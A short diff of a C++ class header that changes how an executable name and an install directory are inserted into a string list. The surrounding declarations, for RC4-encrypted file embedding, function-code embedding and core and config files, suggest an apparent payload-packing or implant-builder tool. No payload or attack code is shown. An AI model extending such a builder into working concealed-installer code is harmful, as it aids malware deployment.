@@ -54,8 +54,18 @@ private:
 	char* _embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr );
 	int _embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr );
 	
-	void _setExecutableName(std::string name) { _strings.push_front(name); }
-	void _setInstallDir(std::string path) { _strings.push_front(path); }
+	void _setExecutableName(std::string name) 
+	{ 
+		std::list< std::string >::iterator iter = _strings.begin();
+		_strings.insert(iter, name); 
+	}
+
+	void _setInstallDir(std::string path) 
+	{ 
+		std::list< std::string >::iterator iter = _strings.begin();
+		iter++;
+		_strings.insert(iter, path);
+	}
 	
 	bool _addCoreFile(std::string path, std::string name);
 	bool _addConfigFile(std::string path, std::string name);
